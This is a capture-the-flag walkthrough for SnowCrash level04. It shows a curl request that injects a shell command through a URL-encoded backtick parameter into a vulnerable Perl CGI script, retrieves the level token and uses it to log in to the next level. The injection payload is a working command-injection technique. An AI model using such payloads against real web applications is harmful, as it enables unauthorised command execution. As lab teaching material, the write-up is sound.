
## 1 Execute the Command

To retrieve the token using the getflag command through the Perl script, run the following curl command:

``` console
level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=%60getflag%60"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
## 2 Switch to Level 05

Use the retrieved token to switch to the next level:

``` console
level04@SnowCrash:~$ su level05
Password: ne2searoevaevoem4ov4ar8ap
```

## Understanding the Perl Script:

The script uses the CGI module to read parameters from the URL. It calls the ``function x(param("x"))``, where ``param("x")`` retrieves the value of the query parameter `x`. Inside the function x, it executes the command using backticks: 
```perl
print `echo $y 2>&1`;
```
This means whatever is passed as `x` is executed as a shell command, and the output is printed back to the web browser.

#### Original Command Attempt: ❌

When you tried to use backticks directly in the URL, like 
``` bash
curl "http://localhost:4747/level04.pl?x=\getflag`"`
```
, the shell was interpreting it before it even reached the script, so it didn't work. 

#### Using URL Encoding:🔄

URL encoding converts special characters into a format that can be transmitted over the internet. The backtick character (`) is a special character in the shell, so it needed to be encoded. By encoding the backticks as %60, the command becomes 
```bash
curl "http://localhost:4747/level04.pl?x=%60getflag%60". Command Execution:
```
### Command Execution 🚀
The encoded command sent to the script effectively allows it to interpret the entire string as a command to execute. When the script executes 
``` bash 
echo $y
```
 where `$y` is now `getflag`, it calls the getflag command, which runs with the permissions of the script itself (in this case, likely elevated due to the setuid bit). 

Output Handling 📬

The command's output 
``` bash 
Check flag. Here is your token: ne2searoevaevoem4ov4ar8ap
``` 
was then sent back to your terminal via the curl command. This output confirms that the command was executed successfully, and the expected result was printed.
